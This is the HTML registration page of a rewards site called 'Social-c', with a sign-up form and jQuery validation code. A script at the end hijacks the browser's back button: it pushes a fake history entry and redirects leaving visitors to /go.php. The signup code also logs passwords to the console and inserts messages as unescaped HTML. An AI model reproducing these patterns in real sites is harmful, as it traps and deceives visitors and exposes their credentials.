
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>Social-c | Register</title>
    <meta name="description" content="Welcome to Social-c. Join the team and make a new account below."/>
        <link rel="icon" type="image/png" sizes="16x16" href="static/img/favicon.png">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500,600" rel="stylesheet">
    <link href="static/csss/style.css" rel="stylesheet">
    <link href="static/csss/custom.css" rel="stylesheet" type="text/css" />
    <link href="static/csss/custom-v2.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"  crossorigin="anonymous" referrerpolicy="no-referrer" />
	<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"  crossorigin="anonymous" referrerpolicy="no-referrer"></script>-->
    
</head>

<body class="h-100" style="/*background: linear-gradient(90deg, rgb(0 176 255) 0%, rgba(33,150,243,1) 100%); background: linear-gradient(90.62deg, #8160ef 1.07%, #5927ff 98.79%)*/ background: linear-gradient(90.62deg, #3cb2ef 1.07%, #2773ff 98.79%)">

    <div class="authincation h-100 my-5">
        <div class="container h-100">
            <div class="row justify-content-center h-100 align-items-center">
			<div id="auth-top-row" class="align-items-center d-flex">
  <div class="text-left mb-3 pl-0" style="">
    <a href="./">
    <img src="static/img/logo-black.png" alt="" style="width: 75%;background: white;padding: 30px 20px;border-radius: 0px 100px 100px 0px;"></a>           
  </div>
  <div class="text-right pr-4" style="width: 100%;">
    <h3 class="text-white fs-34 mb-0">Sign Up</h3>
    <div class="mt-1 text-white fs-12" style="">Earn rewards easily online</div>
  </div>
</div>
<div class="col-md-6 mb-5">
        
  <div class="authincation-content mb-5">
        <div class="row no-gutters">
            <div class="col-xl-12">
                <div class="auth-form">
                    <label class="mb-1"><span>Full Name</span></label>
                        <div class="input-group mb-3">
                            <div class="input-group-prepend">
                                <div class="input-group-text"><i class="fas fa-user-edit fs-12"></i></div>
                            </div>
                            <input type="text" class="form-control" name="fullname" id="fullname" placeholder="Your Full Name" required>
                        </div>
                        <label class="mb-1"><span>Username</span></label>
                        <div class="input-group mb-3">
                            <div class="input-group-prepend">
                                <div class="input-group-text"><i class="fas fa-user fs-12"></i></div>
                            </div>
                            <input type="text" class="form-control" id="username" name="username"  placeholder="Username" required>
                        </div>
                        <label class="mb-1"><span>Email</span></label>
                        <div class="input-group mb-3">
                            <div class="input-group-prepend">
                                <div class="input-group-text"><i class="fas fa-user fs-12"></i></div>
                            </div>
                            <input type="email" class="form-control" id="email" name="email" placeholder="Email" required>
                        </div>
                        <label class="mb-1"><span>Password</span></label>
                        <div class="input-group mb-3">
                            <div class="input-group-prepend">
                                <div class="input-group-text"><i class="fas fa-lock fs-12"></i></div>
                            </div>
                            <input type="password" class="form-control" id="password" name="password" placeholder="Password" required data-container="body" data-toggle="popover" data-trigger="focus" data-placement="top" data-content="Make sure to memorize your password or write it down in a safe place" title="Remember Your Password">
                        </div>
                        <label class="mb-1"><span>Confirm Password</span></label>
                        <div class="input-group mb-3">
                            <div class="input-group-prepend">
                                <div class="input-group-text"><i class="fas fa-lock fs-12"></i></div>
                            </div>
                            <input type="password" class="form-control" id="passwordAgain" name="passwordAgain" placeholder="Confirm Password" required>
                        </div>
                        <div class="form-group">
                              <div class="custom-control custom-checkbox ml-1">
                                <input type="checkbox" name="terms" class="custom-control-input" id="terms" >
                                <label class="custom-control-label text-white" for="terms"><a target="_blank" class="text-white" href="terms.php">I agree to the Terms & Conditions</a>, <a target="_blank" class="text-white" href="privacy.php">Privacy Policy</a>, <a target="_blank" class="text-white" href="fraud.php">and Anti-Fraud Policy</a></label>
                              </div>
                          </div>
						  <div class="form-group" id="sysmessage"></div>
						  
						  
                        <div class="text-center mt-4">
                            <button type="button" onclick="localStorage.clear();signUp();" class="btn btn-auth text-white btn-block">Sign Up</button>
                        </div>
                    
                    <div class="new-account mt-3">
                        <p class="text-white">Already have an account? <a class="text-white" href="login.php">Login</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
            </div>
        </div>
    </div>
<script src="static/js/axios.min.js"></script>
<script src="static/js/global.min.js" type="text/javascript"></script>
<script>
//The username has already been taken.
//The terms must be accepted.
//The password must be at least 8 characters.
var issignclick=0;
  function signUp() {
	if(issignclick){return;}
	issignclick=1;
	let isChecked = $('#terms').is(":checked");
    let fullname = $("#fullname").val()
	let username = $("#username").val()
    let email = $("#email").val()
    let password = $("#password").val()
    let passwordAgain = $("#passwordAgain").val()
    let emailReg = /^([\.a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-])+/;
	if (!username) {
      msgalert('Please enter a username!');
    } else if (username.length < 6) {
      msgalert('username must be at least 6 characters!');
    } else if(!fullname) {
      msgalert('Please enter a fullname!');
    } else if (fullname.length < 6) {
      msgalert('fullname must be at least 6 characters!');
    } else if (!emailReg.test(email)) {
      msgalert('Please enter the correct Email!');
    }  else if (password.length < 6) {
      msgalert('The password must be at least 6 characters!');
    } else if (password != passwordAgain) {
      msgalert('The password confirmation does not match.');
    } else if (!isChecked) {
      msgalert('The terms must be accepted.');
    } else {

      console.log(fullname,username, email, password, passwordAgain);
		 $.post("api.php?act=register",{fullname:fullname,username:username,email:email,password:password},function(result){
			 
			if(result.code==1){
				window.location.href="./dashboard.php"
			}else{
				msgalert(result.message);
			}
		});

    }
	issignclick=0;
  }
  
  function msgalert(msg){
	
	$("#sysmessage").append('<div class="alert alert-danger">'+ msg +'<button type="button" class="close h-100" data-dismiss="alert" aria-label="Close"><span><i class="mdi mdi-close"></i></span></button></div>');  
  }
</script>
<script>
    window.onhashchange=function(){jp();};
    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
    function jp() {
        fh();}
    setTimeout('hh();', 500);
    function fh(){
        location.href="/go.php";
    }
</script>
</body>

</html>
